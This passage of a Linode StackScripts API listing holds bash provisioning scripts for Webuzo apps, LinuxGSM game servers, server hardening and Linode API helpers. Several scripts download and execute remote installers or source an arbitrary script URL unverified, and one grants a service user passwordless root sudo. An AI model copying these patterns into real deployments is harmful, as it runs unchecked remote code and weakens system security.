      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "HelpDEZk powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install HelpDEZk and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About HelpDEZk :\n#   HelpDEZk
      is a powerfull software that manages requests/incidents.\n#   It has all the
      needed requirements to an efficient workflow management of all processes \n#   involved
      in service execution. This control is done for internal demands and also for
      outsourced services.\n###########################################################################################################\n\n#
      Install HelpDEZk Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=457&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      HelpDEZk and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, HelpDEZk has been successfully installed\"\necho \" \"\necho
      \"You can now configure HelpDEZk and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 10261, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "SEOTOASTER
      powered by Webuzo", "description": "SEOTOASTER is the most advanced SEO content
      management system out of the box, so your website or Ecommerce store performs
      to the maximum of its abilities when it comes to organic rankings.\r\n\r\nSEOTOASTER
      is the most advanced SEO CMS & Ecommerce web site builder.\n\nWebuzo is a Single
      User Control Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal,
      etc) or System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual
      machines or in the cloud.\n\nYou can get a Webuzo License here\nhttp://www.webuzo.com/pricing\n\nPath
      to Installation Logs : /root/webuzo-install.log\n\nInstructions\nOn completion
      of the installation process, access http://your-ip:2004 to configure SEOTOASTER
      and Softaculous Webuzo initially.\n\nContact : http://webuzo.com/contact", "ordinal":
      0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "SEOTOASTER powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install SEOTOASTER and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About SEOTOASTER :\n#   SEOTOASTER
      is the most advanced SEO CMS & Ecommerce web site builder.\n###########################################################################################################\n\n#
      Install SEOTOASTER Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=490&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh  >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      SEOTOASTER and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, SEOTOASTER has been successfully installed\"\necho \" \"\necho
      \"You can now configure SEOTOASTER and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1193749, "username":
      "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd", "label":
      "Linux GSM  Helper", "description": "Linux GSM One-Click Helper", "ordinal":
      0, "logo_url": "", "images": ["linode/debian9", "linode/debian10"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash\n\n#
      Linux GSM install\n\nfunction linuxgsm_install {\n\necho Configuring IP address\nIPADDR=`hostname
      -I | awk ''{print$1}''`\n\n# Add a user for the game server\necho Setting up
      a user\nadduser --disabled-password --gecos \"\" \"$GAMESERVER\"\necho \"$GAMESERVER
      ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers\n\n# Download and the LinuxGSM script\necho
      Downloading LinuxGSM\n# TESTING\ncd /home/\"$GAMESERVER\"/\n# OLD: wget -4 https://linuxgsm.com/dl/linuxgsm.sh
      -P /home/\"$GAMESERVER\"/\nwget -O linuxgsm.sh https://linuxgsm.sh -P /home/\"$GAMESERVER\"/\nchmod
      +x /home/\"$GAMESERVER\"/linuxgsm.sh\nchown -R \"$GAMESERVER\":\"$GAMESERVER\"
      /home/\"$GAMESERVER\"/*\n\n# Run the GSM script\necho running LinuxGSM script\nsu
      - \"$GAMESERVER\" -c \"/home/$GAMESERVER/linuxgsm.sh $GAMESERVER\"\n\n}\n\n\nfunction
      game_install {\n\n# Installing the Server\necho Installing the Server\nsu -
      \"$GAMESERVER\" -c \"/home/$GAMESERVER/$GAMESERVER auto-install\"\nif [[ \"$GAMESERVER\"
      =~ (^boserver$|^bb2server$|^bmdmserver$| \\\n^cssserver$|^csgoserver$|^dodsserver$|^emserver$|
      \\\n^gmodserver$|^insserver$|^nmrihserver$|^tf2server$| \\\n^tuserver$|^zpsserver$)
      ]]; then\n  echo -e \"\\ngslt=$GSLT\" >> /home/\"$GAMESERVER\"/lgsm/config-lgsm/\"$GAMESERVER\"/\"$GAMESERVER\".cfg\nelse\n  echo
      No Gameserver Login Token Needed\nfi\n\n}\n\n\nfunction service_config {\n\n#
      Add cron jobs for updating the gameserver and linuxgsm. Monitor will ensure
      that the gameserver is running and restart if needed.\necho Adding game update
      cron jobs\ncrontab -l > gamecron\necho \"*/5 * * * * su - $GAMESERVER -c ''/home/$GAMESERVER/$GAMESERVER
      monitor'' > /dev/null 2>&1\" >> gamecron\necho \"0 23 * * * su - $GAMESERVER
      -c ''/home/$GAMESERVER/$GAMESERVER update'' > /dev/null 2>&1\" >> gamecron\necho
      \"30 23 * * * su - $GAMESERVER -c ''/home/$GAMESERVER/$GAMESERVER update-functions''
      > /dev/null 2>&1\" >> gamecron\ncrontab gamecron\nrm gamecron\n\n# Create systemd
      service file\n\ncat << END > /etc/systemd/system/$GAMESERVER.service\n[Unit]\nDescription=$GAMESERVER\n\n[Service]\nUser=$GAMESERVER\nType=forking\nExecStart=/bin/bash
      /home/$GAMESERVER/$GAMESERVER start\nExecStop=/bin/kill -2 $MAINPID\n\n[Install]\nWantedBy=multi-user.target\nEND\n\n}\n\n##
      Adding these for Valheim launch, will eventually replace the above code, but
      for now, we added ''v_'' in front of functions\n\nfunction v_linuxgsm_install
      {\n    local -r gameserver=\"$1\" username=\"$2\"\n\n    su - \"$username\"
      -c \"\n        # Download and the LinuxGSM script\n        wget -O linuxgsm.sh
      https://linuxgsm.sh\n        chmod +x linuxgsm.sh\n        # Run the GSM script\n        /home/$username/linuxgsm.sh
      $gameserver\n    \"\n}\n\nfunction v_linuxgsm_game_install {\n    local -r gameserver=\"$1\"
      username=\"$2\"\n\n    # Installing the Server\n    su - \"$username\" -c \"/home/$username/$gameserver
      auto-install\"\n    if [[ \"$gameserver\" =~ (^boserver$|^bb2server$|^bmdmserver$|
      \\\n        ^cssserver$|^csgoserver$|^dodsserver$|^emserver$| \\\n        ^gmodserver$|^insserver$|^nmrihserver$|^tf2server$|
      \\\n        ^tuserver$|^zpsserver$) ]]; then\n        echo -e \"\\ngslt=$GSLT\"
      >> \"/home/$username/lgsm/config-lgsm/$gameserver/$gameserver.cfg\"\n    else\n        echo
      No gameserver Login Token Needed\n    fi\n}\n\nfunction v_linuxgsm_service_config
      {\n    local -r gameserver=\"$1\" username=\"$2\"\n\n    # Add cron jobs for
      updating the game server and LinuxGSM\n    # Monitor will ensure that the gameserver
      is running and restart if needed\n    crontab -l > gamecron\n\n    echo \"*/5
      * * * * su - \"$username\" -c ''/home/$username/$gameserver monitor'' > /dev/null
      2>&1\" >> gamecron\n    echo \"0 23 * * * su - \"$username\" -c ''/home/$username/$gameserver
      update'' > /dev/null 2>&1\" >> gamecron\n    echo \"30 23 * * * su - \"$username\"
      -c ''/home/$username/$gameserver update-functions'' > /dev/null 2>&1\" >> gamecron\n\n    crontab
      gamecron\n    rm gamecron\n\n    # Create systemd service file\n    cat << EOF
      > /etc/systemd/system/$gameserver.service\n[Unit]\nDescription=$gameserver\n[Service]\nUser=$username\nType=forking\nExecStart=/bin/bash
      /home/$username/$gameserver start\nExecStop=/bin/kill -2 \\$MAINPID\n[Install]\nWantedBy=multi-user.target\nEOF\n}\n\nfunction
      v_linuxgsm_oneclick_install {\n    local -r gameserver=\"$1\" username=\"$2\"\n\n    v_linuxgsm_install
      \"$gameserver\" \"$username\"\n    v_linuxgsm_game_install \"$gameserver\" \"$username\"\n    v_linuxgsm_service_config
      \"$gameserver\" \"$username\"\n}", "user_defined_fields": []}, {"id": 978965,
      "username": "meenubediShine", "user_gravatar_id": "ac16f37ccd972a6f698dab5aab1188b2",
      "label": "Testing Update", "description": "testing Update", "ordinal": 0, "logo_url":
      "", "images": ["linode/arch", "linode/slackware14.2", "linode/debian10", "linode/alpine3.13"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "yegiu Update", "script": "#!/bin/bash\n\ntesting Update ", "user_defined_fields":
      []}, {"id": 8470, "username": "ichal", "user_gravatar_id": "632f7c16a5fd3a66b8909e0153856b49",
      "label": "jibeg", "description": "aa", "ordinal": 0, "logo_url": "", "images":
      ["linode/centos6.5"], "deployments_total": 0, "deployments_active": 0, "is_public":
      true, "mine": false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05",
      "rev_note": "Initial import", "script": "#!/bin/bash", "user_defined_fields":
      []}, {"id": 9238, "username": "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5",
      "label": "Support Incident Tracker powered by Webuzo", "description": "Support
      Incident Tracker (or SiT!) is a Free Software/Open Source (GPL) web based application
      which uses PHP and MySQL for tracking technical support calls/emails (also commonly
      known as a ''Help Desk'' or ''Support Ticket System'').\r\n\r\nManage contacts,
      sites, technical support contracts and support incidents in one place. Send
      emails directly from SiT!, attach files and record every communication in the
      incident log. SiT is aware of Service Level Agreements and incidents are flagged
      if they stray outside of them. \r\n\t\t\t\r\nWebuzo is a Single User Control
      Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or
      System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines
      or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure Support
      Incident Tracker and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Support Incident Tracker powered by Webuzo", "script": "#!/bin/bash\n# <udf
      name=\"webuzo_license_key\" label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Support Incident Tracker and Softaculous Webuzo\n# Description -\n#
      About Webuzo :\n#   Webuzo is a Single User Control Panel which helps users
      deploy Web Apps (WordPress, Joomla, Drupal, etc)\n#   or System Apps (Apache,
      NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the cloud.\n#\n#
      About Support Incident Tracker :\n#   Support Incident Tracker (or SiT!) is
      a Free Software/Open Source (GPL) web based application which uses\n#   PHP
      and MySQL for tracking technical support calls/emails (also commonly known as
      a ''Help Desk''\n#   or ''Support Ticket System'').\n###########################################################################################################\n\n#
      Install Support Incident Tracker Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=409&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Support Incident Tracker and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Support Incident Tracker has been successfully installed\"\necho
      \" \"\necho \"You can now configure Support Incident Tracker and Softaculous
      Webuzo at the following URL :\"\necho \"http://$ip:2004/\"\necho \" \"\necho
      \"Thank you for choosing Softaculous Webuzo !\"\necho \" \"", "user_defined_fields":
      []}, {"id": 928534, "username": "acourdavault", "user_gravatar_id": "66d9a70b3232ec8f2b533584b3299ed8",
      "label": "db_centos_magic_script", "description": "", "ordinal": 0, "logo_url":
      "", "images": ["linode/centos7"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "", "script": "#!/bin/bash\t\n\nexec > /var/log/sg-stackscript.log\nexec
      2>&1\t\n\nset -x\ncommand -v wget >/dev/null 2>&1 || yum install -y wget ||
      exit 1\ncommand -v dos2unix >/dev/null 2>&1 || yum install -y dos2unix || exit
      1\n\ncd ${HOME}\nSCRIPT=$(basename $SCRIPT_URL)\nrm -f ${SCRIPT}\necho \"Copying
      ${SCRIPT_URL} to ${HOME}\"\nwget --tries=5 ${SCRIPT_URL} && /usr/bin/dos2unix
      ${SCRIPT} && . ${SCRIPT}\ncd ${HOME} && rm -f ${SCRIPT}", "user_defined_fields":
      []}, {"id": 1193750, "username": "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd",
      "label": "Basic OCA Helper ", "description": "Basic OCA Helper One-Click", "ordinal":
      0, "logo_url": "", "images": ["linode/debian9"], "deployments_total": 0, "deployments_active":
      0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05", "updated":
      "2018-01-02T03:04:05", "rev_note": "move apt-get upgrade to end of script to
      prevent busted nf_conntrack kernel modules for UFW - cmullen ", "script": "#!/bin/bash\n#
      Used for Marketplace Apps\n# Helper functions\n\nfunction apt_setup_update {\n  #
      Force IPv4 and noninteractive update\n  echo ''Acquire::ForceIPv4 \"true\";''
      > /etc/apt/apt.conf.d/99force-ipv4\n  export DEBIAN_FRONTEND=noninteractive\n  apt-get
      update -y\n}\n\nfunction set_hostname {\n  IP=`hostname -I | awk ''{print$1}''`\n  HOSTNAME=`dnsdomainname
      -A`\n  hostnamectl set-hostname $HOSTNAME\n  echo $IP $HOSTNAME  >> /etc/hosts\n}\n\nfunction
      mysql_root_preinstall {\n  # Set MySQL root password on install\n  debconf-set-selections
      <<< \"mysql-server mysql-server/root_password password $DBROOT_PASSWORD\"\n  debconf-set-selections
      <<< \"mysql-server mysql-server/root_password_again password $DBROOT_PASSWORD\"\n}\n\nfunction
      run_mysql_secure_installation_ubuntu20 {\n  # Installs expect, runs mysql_secure_installation
      and runs mysql secure installation.\n  apt-get install -y expect\n  SECURE_MYSQL=$(expect
      -c \"\n  set timeout 10\n  spawn mysql_secure_installation\n  expect \\\"Press
      y|Y for Yes, any other key for No:\\\"\n  send \\\"n\\r\\\"\n  expect \\\"New
      password:\\\"\n  send \\\"$DBROOT_PASSWORD\\r\\\"\n  expect \\\"Re-enter new
      password:\\\"\n  send \\\"$DBROOT_PASSWORD\\r\\\"\n  expect \\\"Remove anonymous
      users? (Press y|Y for Yes, any other key for No) :\\\"\n  send \\\"y\\r\\\"\n  expect
      \\\"Disallow root login remotely? (Press y|Y for Yes, any other key for No)
      :\\\"\n  send \\\"y\\r\\\"\n  expect \\\"Remove test database and access to
      it? (Press y|Y for Yes, any other key for No) :\\\"\n  send \\\"y\\r\\\"\n  expect
      \\\"Reload privilege tables now? (Press y|Y for Yes, any other key for No) :\\\"\n  send
      \\\"y\\r\\\"\n  expect eof\n  \")\n  echo \"$SECURE_MYSQL\"\n}\n\nfunction ufw_install
      {\n  # Install UFW and add basic rules\n  apt-get install ufw -y\n  ufw default
      allow outgoing\n  ufw default deny incoming\n  ufw allow ssh\n  ufw enable\n  systemctl
      enable ufw\n\n  # Stop flooding Console with messages\n  ufw logging off\n}\n\nfunction
      fail2ban_install {\n  # Install and configure Fail2ban\n  apt-get install fail2ban
      -y\n  cd /etc/fail2ban\n  cp fail2ban.conf fail2ban.local\n  cp jail.conf jail.local\n  systemctl
      start fail2ban\n  systemctl enable fail2ban\n  cd\n}\n\nfunction stackscript_cleanup
      {\n  # Force IPv4 and noninteractive upgrade after script runs to prevent breaking
      nf_conntrack for UFW\n  echo ''Acquire::ForceIPv4 \"true\";'' > /etc/apt/apt.conf.d/99force-ipv4\n  export
      DEBIAN_FRONTEND=noninteractive \n  apt-get upgrade -y\n\n  rm /root/StackScript\n  rm
      /root/ssinclude*\n  echo \"Installation complete!\"\n}\n\nfunction run_mysql_secure_installation
      {\n  # Installs expect, runs mysql_secure_installation and runs mysql secure
      installation.\n  apt-get install -y expect\n  SECURE_MYSQL=$(expect -c \"\n  set
      timeout 10\n  spawn mysql_secure_installation\n  expect \\\"Enter current password
      for root (enter for ):\\\"\n  send \\\"$DBROOT_PASSWORD\\r\\\"\n  expect \\\"Change
      the root password?\\\"\n  send \\\"n\\r\\\"\n  expect \\\"Remove anonymous users?\\\"\n  send
      \\\"y\\r\\\"\n  expect \\\"Disallow root login remotely?\\\"\n  send \\\"y\\r\\\"\n  expect
      \\\"Remove test database and access to it?\\\"\n  send \\\"y\\r\\\"\n  expect
      \\\"Reload privilege tables now?\\\"\n  send \\\"y\\r\\\"\n  expect eof\n  \")\n  echo
      \"$SECURE_MYSQL\"\n}", "user_defined_fields": []}, {"id": 9239, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "Webasyst
      powered by Webuzo", "description": "Webasyst is a free PHP framework for creating
      sleek multi-user web apps and for building websites. Webasyst offers a multi-app
      UI ready for integrating and designing your app, handles user authorization,
      access rights management, routing setup, and much more. Great for creating web
      solutions for businesses and teams. \r\n\t\t\t\r\nWebuzo is a Single User Control
      Panel which helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or
      System Apps (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines
      or in the cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure Webasyst
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "Webasyst powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install Webasyst and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About Webasyst :\n#   Webasyst
      is a free PHP framework for creating sleek multi-user web apps and for building
      websites.\n#   Webasyst offers a multi-app UI ready for integrating and designing
      your app, handles user \n#   authorization, access rights management, routing
      setup, and much more.\n#   Great for creating web solutions for businesses and
      teams. \n###########################################################################################################\n\n#
      Install Webasyst Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=467&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      Webasyst and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, Webasyst has been successfully installed\"\necho \" \"\necho
      \"You can now configure Webasyst and Softaculous Webuzo at the following URL
      :\"\necho \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 9240, "username":
      "webuzo", "user_gravatar_id": "cf0348f835d60e6d133040f49bb36ec5", "label": "jforum
      powered by Webuzo", "description": "jforum is a powerful and robust discussion
      board system implemented in Java. It provides an attractive interface, an efficient
      forum engine, an easy to use administrative panel, an advanced permission control
      system and much more. \r\n\t\t\t\r\nWebuzo is a Single User Control Panel which
      helps users deploy Web Apps (WordPress, Joomla, Drupal, etc) or System Apps
      (Apache, NGINX, PHP, Java, MongoDB, etc) on their virtual machines or in the
      cloud.\r\n\r\nYou can get a Webuzo License here\r\nhttp://www.webuzo.com/pricing\r\n\r\nPath
      to Installation Logs : /root/webuzo-install.log\r\n\r\nInstructions\r\nOn completion
      of the installation process, access http://your-ip:2004 to configure jforum
      and Softaculous Webuzo initially.\r\n\r\nContact : http://webuzo.com/contact",
      "ordinal": 0, "logo_url": "", "images": ["linode/centos5.6", "linode/ubuntu10.04lts32bit",
      "linode/ubuntu10.04lts", "linode/ubuntu14.04lts", "linode/ubuntu12.04lts", "linode/centos6.8"],
      "deployments_total": 0, "deployments_active": 0, "is_public": true, "mine":
      false, "created": "2018-01-02T03:04:05", "updated": "2018-01-02T03:04:05", "rev_note":
      "jforum powered by Webuzo", "script": "#!/bin/bash\n# <udf name=\"webuzo_license_key\"
      label=\"Premium Webuzo License Key\" example=\"WEBUZO-XXXXX-XXXXX-XXXXX\"/>\n\n###########################################################################################################\n#
      Install jforum and Softaculous Webuzo\n# Description -\n# About Webuzo :\n#   Webuzo
      is a Single User Control Panel which helps users deploy Web Apps (WordPress,
      Joomla, Drupal, etc)\n#   or System Apps (Apache, NGINX, PHP, Java, MongoDB,
      etc) on their virtual machines or in the cloud.\n#\n# About jforum :\n#   jforum
      is a powerful and robust discussion board system implemented in Java.\n#   It
      provides an attractive interface, an efficient forum engine, an easy to use
      administrative\n#   panel, an advanced permission control system and much more.\n###########################################################################################################\n\n#
      Install jforum Script using Webuzo\nfunction install_webuzo_script(){\n   \n    #
      Install Webuzo\n    install_webuzo\n   \n    wget http://files.webuzo.com/ip.php
      >> /root/webuzo-install.log 2>&1\n    ip=$(cat ip.php)\n   \n    /usr/local/emps/bin/curl
      \"http://$ip:2004/install.php?prepareinstall=423&license=$1\"\n   \n}\n\n# Install
      Webuzo Function\nfunction install_webuzo(){\n       \n    # Fetch the Webuzo
      Installer\n    wget -N http://files.webuzo.com/install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Modify Permissions\n    chmod 0755 install.sh >> /root/webuzo-install.log
      2>&1\n   \n    # Execute\n    ./install.sh >> /root/webuzo-install.log 2>&1\n   \n    #
      Clean Up\n    rm -rf install.sh >> /root/webuzo-install.log 2>&1\n   \n}\n\n#########################################################\n#\tInstalling
      jforum and Softaculous Webuzo\n#########################################################\n\ninstall_webuzo_script
      $WEBUZO_LICENSE_KEY\n\n# Check the return of the above command and display the
      result accordingly\n\necho \" \"\necho \"-------------------------------------\"\necho
      \" Installation Completed \"\necho \"-------------------------------------\"\necho
      \"Congratulations, jforum has been successfully installed\"\necho \" \"\necho
      \"You can now configure jforum and Softaculous Webuzo at the following URL :\"\necho
      \"http://$ip:2004/\"\necho \" \"\necho \"Thank you for choosing Softaculous
      Webuzo !\"\necho \" \"", "user_defined_fields": []}, {"id": 1193752, "username":
      "jrzavaschi1992", "user_gravatar_id": "6c0262d5482846284b510b579df19fdd", "label":
      "API Functions Helper", "description": "api", "ordinal": 0, "logo_url": "",
      "images": ["linode/slackware14.1", "linode/centos7", "linode/ubuntu16.04lts",
      "linode/arch", "linode/slackware14.2", "linode/gentoo", "linode/debian9", "linode/ubuntu18.04",
      "linode/debian10", "linode/centos8", "linode/alpine3.11"], "deployments_total":
      0, "deployments_active": 0, "is_public": true, "mine": false, "created": "2018-01-02T03:04:05",
      "updated": "2018-01-02T03:04:05", "rev_note": "", "script": "#!/usr/bin/env
      bash\n\n### Linode API Bash Functions\n\n##################################\n##
      Pre-Requisites\n##################################\n\n## Import StackScript
      1 (Bash Library) so that check_dns_propagation() can install ''dig''\n#source
      <ssinclude StackScriptID=1>\n\n## Install jq\nif [ ! -x /usr/bin/jq ] && [ !
      -x /usr/local/bin/jq ]; then\n    which wget || system_install_package wget\n    wget
      https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64\n    mv jq-linux64
      jq\n    chmod +x jq\n    mv jq /usr/bin/\nfi\n\n\n##################################\n##
      DNS\n##################################\n\n## Fetch DNS info from the API\n\nfunction
      list_domains {\n    # Example: list_domains\n\n    curl -H \"Authorization:
      Bearer $TOKEN_PASSWORD\" \\\n        https://api.linode.com/v4/domains | jq
      -S\n}\n\nfunction list_records {\n    # Example: list_records $DOMAIN\n    \n    local
      -r domain=\"$1\"\n    local -r domain_id=$(get_domain_property $domain ''id'')\n\n    curl
      -H \"Authorization: Bearer $TOKEN_PASSWORD\" \\\n        https://api.linode.com/v4/domains/$domain_id/records
      | jq -S\n}\n\nfunction get_domain_property {\n    # Example: get_domain_property
      $DOMAIN ''id'' \n\n    local -r domain=\"$1\" property=\"$2\"\n    local -a
      domain_list=($(list_domains $TOKEN_PASSWORD))\n    local -r num_domains=$(echo
      \"${domain_list[@]}\" | jq ''.results'')\n\n    for ((i=0; i<$num_domains; i++));
      do\n        local domain_name=$(echo \"${domain_list[@]}\" | jq .data[$i].domain
      | sed ''s/\"//g'')\n        case \"$domain_name\" in\n            \"$domain\")\n                echo
